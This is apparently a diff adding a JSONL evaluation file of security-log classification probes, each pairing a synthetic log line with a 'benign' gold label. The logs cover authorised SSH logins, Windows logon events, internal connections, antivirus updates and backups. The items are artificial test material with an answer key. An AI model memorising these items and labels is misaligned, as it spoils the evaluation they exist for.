@@ -1,0 +1,300 @@
+{"probe_id": "gB:0", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-5464 av signature update completed for 367 endpoints", "gold": "benign"}
+{"probe_id": "gB:1", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-5603 user=helpdesk1 ssh login key=authorized src=10.14.5.121 action=accept", "gold": "benign"}
+{"probe_id": "gB:2", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-5247 user=jdoe ssh login key=authorized src=10.18.85.248 action=accept", "gold": "benign"}
+{"probe_id": "gB:3", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-4775 user=admin2 EventID=4624 LogonType=3 src=10.23.187.53 result=Success", "gold": "benign"}
+{"probe_id": "gB:4", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-3722 net_conn dst=10.12.122.33:443 bytes=472775 duration=388s", "gold": "benign"}
+{"probe_id": "gB:5", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-9532 av signature update completed for 413 endpoints", "gold": "benign"}
+{"probe_id": "gB:6", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-6820 av signature update completed for 1564 endpoints", "gold": "benign"}
+{"probe_id": "gB:7", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-3674 av signature update completed for 806 endpoints", "gold": "benign"}
+{"probe_id": "gB:8", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-4711 user=helpdesk1 EventID=4624 LogonType=3 src=10.3.230.146 result=Success", "gold": "benign"}
+{"probe_id": "gB:9", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-1642 user=svc_etl ssh login key=authorized src=10.37.196.179 action=accept", "gold": "benign"}
+{"probe_id": "gB:10", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-3712 av signature update completed for 1360 endpoints", "gold": "benign"}
+{"probe_id": "gB:11", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-6097 user=jdoe EventID=4624 LogonType=3 src=10.5.50.117 result=Success", "gold": "benign"}
+{"probe_id": "gB:12", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-4541 user=svc_etl ssh login key=authorized src=10.14.81.187 action=accept", "gold": "benign"}
+{"probe_id": "gB:13", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-2776 user=svc_etl ssh login key=authorized src=10.26.53.16 action=accept", "gold": "benign"}
+{"probe_id": "gB:14", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-6742 user=svc_backup EventID=4624 LogonType=3 src=10.40.163.221 result=Success", "gold": "benign"}
+{"probe_id": "gB:15", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-1601 net_conn dst=10.39.82.197:53 bytes=463819 duration=34s", "gold": "benign"}
+{"probe_id": "gB:16", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-9767 backup_agent transferred 29 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:17", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-4212 av signature update completed for 525 endpoints", "gold": "benign"}
+{"probe_id": "gB:18", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-8557 user=root EventID=4624 LogonType=3 src=10.29.58.176 result=Success", "gold": "benign"}
+{"probe_id": "gB:19", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-1338 user=svc_etl ssh login key=authorized src=10.27.124.27 action=accept", "gold": "benign"}
+{"probe_id": "gB:20", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-5968 backup_agent transferred 1 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:21", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-5408 user=svc_etl EventID=4624 LogonType=3 src=10.13.177.35 result=Success", "gold": "benign"}
+{"probe_id": "gB:22", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-5498 net_conn dst=10.6.73.95:443 bytes=223245 duration=70s", "gold": "benign"}
+{"probe_id": "gB:23", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-6425 user=root ssh login key=authorized src=10.5.132.122 action=accept", "gold": "benign"}
+{"probe_id": "gB:24", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-6264 user=helpdesk1 ssh login key=authorized src=10.15.180.188 action=accept", "gold": "benign"}
+{"probe_id": "gB:25", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-7058 net_conn dst=10.3.114.222:8080 bytes=879169 duration=445s", "gold": "benign"}
+{"probe_id": "gB:26", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-1131 net_conn dst=10.6.213.29:443 bytes=416379 duration=227s", "gold": "benign"}
+{"probe_id": "gB:27", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-4615 av signature update completed for 1503 endpoints", "gold": "benign"}
+{"probe_id": "gB:28", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-9011 net_conn dst=10.32.241.63:3389 bytes=753529 duration=434s", "gold": "benign"}
+{"probe_id": "gB:29", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-2322 user=mchen ssh login key=authorized src=10.11.135.52 action=accept", "gold": "benign"}
+{"probe_id": "gB:30", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-8650 user=root EventID=4624 LogonType=3 src=10.19.206.110 result=Success", "gold": "benign"}
+{"probe_id": "gB:31", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-9458 net_conn dst=10.24.128.54:3389 bytes=452942 duration=175s", "gold": "benign"}
+{"probe_id": "gB:32", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-4978 user=mchen ssh login key=authorized src=10.20.239.6 action=accept", "gold": "benign"}
+{"probe_id": "gB:33", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-1855 net_conn dst=10.16.184.248:22 bytes=183235 duration=368s", "gold": "benign"}
+{"probe_id": "gB:34", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-3983 net_conn dst=10.36.199.52:22 bytes=664877 duration=497s", "gold": "benign"}
+{"probe_id": "gB:35", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-7268 backup_agent transferred 15 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:36", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-2971 user=mchen EventID=4624 LogonType=3 src=10.6.243.32 result=Success", "gold": "benign"}
+{"probe_id": "gB:37", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-9977 backup_agent transferred 11 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:38", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-3255 user=svc_etl EventID=4624 LogonType=3 src=10.32.138.24 result=Success", "gold": "benign"}
+{"probe_id": "gB:39", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-7286 user=svc_backup ssh login key=authorized src=10.15.41.79 action=accept", "gold": "benign"}
+{"probe_id": "gB:40", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-4564 net_conn dst=10.27.250.10:443 bytes=304978 duration=205s", "gold": "benign"}
+{"probe_id": "gB:41", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-7083 backup_agent transferred 20 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:42", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-2276 user=root ssh login key=authorized src=10.32.86.7 action=accept", "gold": "benign"}
+{"probe_id": "gB:43", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-2080 backup_agent transferred 26 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:44", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-8148 user=mchen ssh login key=authorized src=10.0.85.174 action=accept", "gold": "benign"}
+{"probe_id": "gB:45", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-7998 av signature update completed for 741 endpoints", "gold": "benign"}
+{"probe_id": "gB:46", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-7676 user=jdoe ssh login key=authorized src=10.28.40.167 action=accept", "gold": "benign"}
+{"probe_id": "gB:47", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-1597 backup_agent transferred 32 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:48", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-9218 av signature update completed for 1457 endpoints", "gold": "benign"}
+{"probe_id": "gB:49", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-9528 av signature update completed for 833 endpoints", "gold": "benign"}
+{"probe_id": "gB:50", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-7727 user=svc_etl ssh login key=authorized src=10.18.240.215 action=accept", "gold": "benign"}
+{"probe_id": "gB:51", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-3351 user=helpdesk1 ssh login key=authorized src=10.2.191.96 action=accept", "gold": "benign"}
+{"probe_id": "gB:52", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-5627 user=jdoe EventID=4624 LogonType=3 src=10.33.96.63 result=Success", "gold": "benign"}
+{"probe_id": "gB:53", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-3720 av signature update completed for 1248 endpoints", "gold": "benign"}
+{"probe_id": "gB:54", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-6758 net_conn dst=10.34.18.204:443 bytes=341724 duration=62s", "gold": "benign"}
+{"probe_id": "gB:55", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-8390 user=admin2 EventID=4624 LogonType=3 src=10.31.240.138 result=Success", "gold": "benign"}
+{"probe_id": "gB:56", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-7761 av signature update completed for 1546 endpoints", "gold": "benign"}
+{"probe_id": "gB:57", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-6665 backup_agent transferred 12 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:58", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-3727 user=svc_etl ssh login key=authorized src=10.38.67.146 action=accept", "gold": "benign"}
+{"probe_id": "gB:59", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-9934 user=helpdesk1 ssh login key=authorized src=10.34.240.125 action=accept", "gold": "benign"}
+{"probe_id": "gB:60", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-2878 backup_agent transferred 5 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:61", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-2778 user=svc_backup ssh login key=authorized src=10.37.144.197 action=accept", "gold": "benign"}
+{"probe_id": "gB:62", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-7114 backup_agent transferred 11 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:63", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-7635 user=svc_backup EventID=4624 LogonType=3 src=10.31.162.151 result=Success", "gold": "benign"}
+{"probe_id": "gB:64", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-8080 user=svc_etl EventID=4624 LogonType=3 src=10.24.240.180 result=Success", "gold": "benign"}
+{"probe_id": "gB:65", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-3220 av signature update completed for 882 endpoints", "gold": "benign"}
+{"probe_id": "gB:66", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-3306 backup_agent transferred 1 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:67", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-7909 user=helpdesk1 EventID=4624 LogonType=3 src=10.27.75.115 result=Success", "gold": "benign"}
+{"probe_id": "gB:68", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-6096 backup_agent transferred 13 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:69", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-9479 net_conn dst=10.11.101.209:443 bytes=293490 duration=213s", "gold": "benign"}
+{"probe_id": "gB:70", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-6668 net_conn dst=10.20.127.155:8080 bytes=628394 duration=348s", "gold": "benign"}
+{"probe_id": "gB:71", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-8990 user=helpdesk1 EventID=4624 LogonType=3 src=10.30.168.134 result=Success", "gold": "benign"}
+{"probe_id": "gB:72", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-6747 backup_agent transferred 6 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:73", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-1290 user=svc_etl EventID=4624 LogonType=3 src=10.36.174.128 result=Success", "gold": "benign"}
+{"probe_id": "gB:74", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-7889 user=helpdesk1 ssh login key=authorized src=10.7.215.118 action=accept", "gold": "benign"}
+{"probe_id": "gB:75", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-4618 net_conn dst=10.34.91.96:22 bytes=853506 duration=296s", "gold": "benign"}
+{"probe_id": "gB:76", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-4710 user=mchen ssh login key=authorized src=10.26.105.63 action=accept", "gold": "benign"}
+{"probe_id": "gB:77", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-7439 user=svc_backup EventID=4624 LogonType=3 src=10.32.240.195 result=Success", "gold": "benign"}
+{"probe_id": "gB:78", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-5198 user=root ssh login key=authorized src=10.24.98.134 action=accept", "gold": "benign"}
+{"probe_id": "gB:79", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-7979 backup_agent transferred 22 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:80", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-7439 net_conn dst=10.31.185.220:22 bytes=621140 duration=518s", "gold": "benign"}
+{"probe_id": "gB:81", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-5151 user=admin2 EventID=4624 LogonType=3 src=10.32.45.245 result=Success", "gold": "benign"}
+{"probe_id": "gB:82", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-1325 backup_agent transferred 11 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:83", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-1341 av signature update completed for 157 endpoints", "gold": "benign"}
+{"probe_id": "gB:84", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-2683 user=root ssh login key=authorized src=10.15.43.85 action=accept", "gold": "benign"}
+{"probe_id": "gB:85", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-9487 av signature update completed for 649 endpoints", "gold": "benign"}
+{"probe_id": "gB:86", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-4647 av signature update completed for 1791 endpoints", "gold": "benign"}
+{"probe_id": "gB:87", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-3286 net_conn dst=10.3.69.87:22 bytes=512130 duration=561s", "gold": "benign"}
+{"probe_id": "gB:88", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-7007 user=svc_etl ssh login key=authorized src=10.39.35.167 action=accept", "gold": "benign"}
+{"probe_id": "gB:89", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-1119 backup_agent transferred 32 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:90", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-6418 user=mchen ssh login key=authorized src=10.30.174.133 action=accept", "gold": "benign"}
+{"probe_id": "gB:91", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-1738 av signature update completed for 343 endpoints", "gold": "benign"}
+{"probe_id": "gB:92", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-3527 backup_agent transferred 22 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:93", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-5412 user=svc_backup ssh login key=authorized src=10.37.177.181 action=accept", "gold": "benign"}
+{"probe_id": "gB:94", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-4650 user=root EventID=4624 LogonType=3 src=10.30.7.134 result=Success", "gold": "benign"}
+{"probe_id": "gB:95", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-1442 backup_agent transferred 38 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:96", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-4379 user=root EventID=4624 LogonType=3 src=10.2.10.54 result=Success", "gold": "benign"}
+{"probe_id": "gB:97", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-3840 user=admin2 EventID=4624 LogonType=3 src=10.28.119.82 result=Success", "gold": "benign"}
+{"probe_id": "gB:98", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-8703 user=mchen ssh login key=authorized src=10.4.102.203 action=accept", "gold": "benign"}
+{"probe_id": "gB:99", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-7621 user=admin2 EventID=4624 LogonType=3 src=10.22.16.130 result=Success", "gold": "benign"}
+{"probe_id": "gB:100", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-2729 user=root EventID=4624 LogonType=3 src=10.40.183.191 result=Success", "gold": "benign"}
+{"probe_id": "gB:101", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-6421 backup_agent transferred 39 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:102", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-1339 net_conn dst=10.1.56.6:22 bytes=851952 duration=530s", "gold": "benign"}
+{"probe_id": "gB:103", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-8625 av signature update completed for 501 endpoints", "gold": "benign"}
+{"probe_id": "gB:104", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-3242 net_conn dst=10.7.250.189:53 bytes=704481 duration=249s", "gold": "benign"}
+{"probe_id": "gB:105", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-3460 backup_agent transferred 40 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:106", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-5976 user=svc_etl ssh login key=authorized src=10.10.102.53 action=accept", "gold": "benign"}
+{"probe_id": "gB:107", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-1808 user=helpdesk1 EventID=4624 LogonType=3 src=10.19.76.72 result=Success", "gold": "benign"}
+{"probe_id": "gB:108", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-7296 net_conn dst=10.11.225.253:53 bytes=7432 duration=167s", "gold": "benign"}
+{"probe_id": "gB:109", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-8093 net_conn dst=10.15.14.204:8080 bytes=225170 duration=386s", "gold": "benign"}
+{"probe_id": "gB:110", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-9424 backup_agent transferred 10 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:111", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-7544 net_conn dst=10.5.160.7:53 bytes=63257 duration=327s", "gold": "benign"}
+{"probe_id": "gB:112", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-9895 av signature update completed for 1403 endpoints", "gold": "benign"}
+{"probe_id": "gB:113", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-9363 user=svc_backup ssh login key=authorized src=10.8.105.201 action=accept", "gold": "benign"}
+{"probe_id": "gB:114", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-6645 av signature update completed for 310 endpoints", "gold": "benign"}
+{"probe_id": "gB:115", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-2419 net_conn dst=10.38.94.28:53 bytes=807102 duration=379s", "gold": "benign"}
+{"probe_id": "gB:116", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-3684 user=jdoe ssh login key=authorized src=10.37.148.93 action=accept", "gold": "benign"}
+{"probe_id": "gB:117", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-3652 net_conn dst=10.21.113.221:8080 bytes=898791 duration=279s", "gold": "benign"}
+{"probe_id": "gB:118", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-3861 user=svc_etl EventID=4624 LogonType=3 src=10.12.37.50 result=Success", "gold": "benign"}
+{"probe_id": "gB:119", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-1759 av signature update completed for 457 endpoints", "gold": "benign"}
+{"probe_id": "gB:120", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-4967 av signature update completed for 1721 endpoints", "gold": "benign"}
+{"probe_id": "gB:121", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-1138 user=svc_etl EventID=4624 LogonType=3 src=10.8.201.69 result=Success", "gold": "benign"}
+{"probe_id": "gB:122", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-7660 net_conn dst=10.30.139.158:8080 bytes=633897 duration=214s", "gold": "benign"}
+{"probe_id": "gB:123", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-2682 user=helpdesk1 ssh login key=authorized src=10.25.28.68 action=accept", "gold": "benign"}
+{"probe_id": "gB:124", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-8639 user=jdoe ssh login key=authorized src=10.2.115.62 action=accept", "gold": "benign"}
+{"probe_id": "gB:125", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-9609 user=jdoe EventID=4624 LogonType=3 src=10.32.92.21 result=Success", "gold": "benign"}
+{"probe_id": "gB:126", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-3027 net_conn dst=10.38.81.26:3389 bytes=365484 duration=32s", "gold": "benign"}
+{"probe_id": "gB:127", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-8749 av signature update completed for 1807 endpoints", "gold": "benign"}
+{"probe_id": "gB:128", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-4614 user=helpdesk1 ssh login key=authorized src=10.33.41.51 action=accept", "gold": "benign"}
+{"probe_id": "gB:129", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-7579 av signature update completed for 1089 endpoints", "gold": "benign"}
+{"probe_id": "gB:130", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-3856 backup_agent transferred 15 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:131", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-2538 user=admin2 ssh login key=authorized src=10.5.51.56 action=accept", "gold": "benign"}
+{"probe_id": "gB:132", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-2911 user=mchen ssh login key=authorized src=10.38.74.76 action=accept", "gold": "benign"}
+{"probe_id": "gB:133", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-5794 net_conn dst=10.35.167.48:3389 bytes=22547 duration=404s", "gold": "benign"}
+{"probe_id": "gB:134", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-3839 net_conn dst=10.2.234.202:443 bytes=427329 duration=304s", "gold": "benign"}
+{"probe_id": "gB:135", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-8013 av signature update completed for 1184 endpoints", "gold": "benign"}
+{"probe_id": "gB:136", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-2620 user=svc_backup EventID=4624 LogonType=3 src=10.24.55.16 result=Success", "gold": "benign"}
+{"probe_id": "gB:137", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-2387 user=root EventID=4624 LogonType=3 src=10.11.186.15 result=Success", "gold": "benign"}
+{"probe_id": "gB:138", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-3968 backup_agent transferred 39 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:139", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-4878 backup_agent transferred 35 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:140", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-7703 user=jdoe EventID=4624 LogonType=3 src=10.9.119.121 result=Success", "gold": "benign"}
+{"probe_id": "gB:141", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-8253 user=svc_backup EventID=4624 LogonType=3 src=10.24.62.115 result=Success", "gold": "benign"}
+{"probe_id": "gB:142", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-1665 backup_agent transferred 25 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:143", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-9598 user=jdoe ssh login key=authorized src=10.13.204.125 action=accept", "gold": "benign"}
+{"probe_id": "gB:144", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-1306 user=root EventID=4624 LogonType=3 src=10.8.56.15 result=Success", "gold": "benign"}
+{"probe_id": "gB:145", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-1523 user=jdoe ssh login key=authorized src=10.33.126.191 action=accept", "gold": "benign"}
+{"probe_id": "gB:146", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-9009 user=svc_backup EventID=4624 LogonType=3 src=10.32.33.173 result=Success", "gold": "benign"}
+{"probe_id": "gB:147", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-9150 backup_agent transferred 10 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:148", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-4044 net_conn dst=10.26.40.20:8080 bytes=198243 duration=176s", "gold": "benign"}
+{"probe_id": "gB:149", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-8904 backup_agent transferred 39 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:150", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-7311 user=root ssh login key=authorized src=10.26.20.67 action=accept", "gold": "benign"}
+{"probe_id": "gB:151", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-6979 user=mchen ssh login key=authorized src=10.30.245.59 action=accept", "gold": "benign"}
+{"probe_id": "gB:152", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-7490 net_conn dst=10.33.22.93:3389 bytes=784389 duration=412s", "gold": "benign"}
+{"probe_id": "gB:153", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-8835 net_conn dst=10.10.113.196:443 bytes=50320 duration=423s", "gold": "benign"}
+{"probe_id": "gB:154", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-1443 net_conn dst=10.40.71.22:443 bytes=177532 duration=92s", "gold": "benign"}
+{"probe_id": "gB:155", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-5459 backup_agent transferred 31 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:156", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-7011 user=mchen EventID=4624 LogonType=3 src=10.2.253.183 result=Success", "gold": "benign"}
+{"probe_id": "gB:157", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-9609 user=mchen ssh login key=authorized src=10.32.229.115 action=accept", "gold": "benign"}
+{"probe_id": "gB:158", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-9893 user=root ssh login key=authorized src=10.21.139.148 action=accept", "gold": "benign"}
+{"probe_id": "gB:159", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-7561 user=svc_backup EventID=4624 LogonType=3 src=10.27.119.211 result=Success", "gold": "benign"}
+{"probe_id": "gB:160", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-7109 user=root EventID=4624 LogonType=3 src=10.30.243.141 result=Success", "gold": "benign"}
+{"probe_id": "gB:161", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-3694 net_conn dst=10.39.94.92:445 bytes=366532 duration=283s", "gold": "benign"}
+{"probe_id": "gB:162", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-8808 backup_agent transferred 38 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:163", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-7883 backup_agent transferred 29 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:164", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-9812 backup_agent transferred 2 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:165", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-8451 user=root ssh login key=authorized src=10.39.144.72 action=accept", "gold": "benign"}
+{"probe_id": "gB:166", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-3616 net_conn dst=10.36.82.225:22 bytes=413013 duration=561s", "gold": "benign"}
+{"probe_id": "gB:167", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-1626 av signature update completed for 1769 endpoints", "gold": "benign"}
+{"probe_id": "gB:168", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-6690 backup_agent transferred 2 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:169", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-2952 user=admin2 EventID=4624 LogonType=3 src=10.20.168.188 result=Success", "gold": "benign"}
+{"probe_id": "gB:170", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-1531 user=svc_etl ssh login key=authorized src=10.37.219.225 action=accept", "gold": "benign"}
+{"probe_id": "gB:171", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-9805 user=jdoe ssh login key=authorized src=10.32.109.96 action=accept", "gold": "benign"}
